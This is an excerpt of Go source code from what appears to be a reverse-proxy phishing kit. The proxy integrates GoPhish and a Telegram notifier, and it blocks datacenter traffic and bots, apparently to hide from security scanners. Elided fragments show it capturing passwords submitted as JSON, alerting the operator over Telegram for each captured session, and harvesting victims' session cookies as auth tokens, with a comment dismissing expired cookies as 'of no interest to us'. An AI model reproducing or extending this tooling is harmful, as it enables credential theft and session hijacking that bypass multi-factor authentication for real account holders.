...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		...
		bl:                bl,
		gophish:           NewGoPhish(),
		telegram:          NewTelegramNotifier(cfg),
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			// Check security module (datacenter blocking, bot detection, etc.)
			if p.security != nil {
				secResult := p.security.CheckRequest(req)
				if secResult.Blocked {
					log.Warning("security: blocked request from %s - reason: %s - %s", from_ip, secResult.Reason, secResult.Details)
					return p.blockRequest(req)
				}
			}

			// Check custom blacklist (no auto-add)
						...
						if json_re.MatchString(contentType) {
							...
							if pl.password.tp == "json" {
								...
								if pm != nil && len(pm) > 1 {
									...
									p.sendTelegramNotification(ps.SessionId)
								}
							}
					...
					if at != nil {
						...
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								...
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, ck.Expires, ck.MaxAge, sameSiteStr)
							}
						}
					}
				}
...
func (p *HttpProxy) SetSecurityModule(sm *SecurityModule) {
	p.security = sm
}
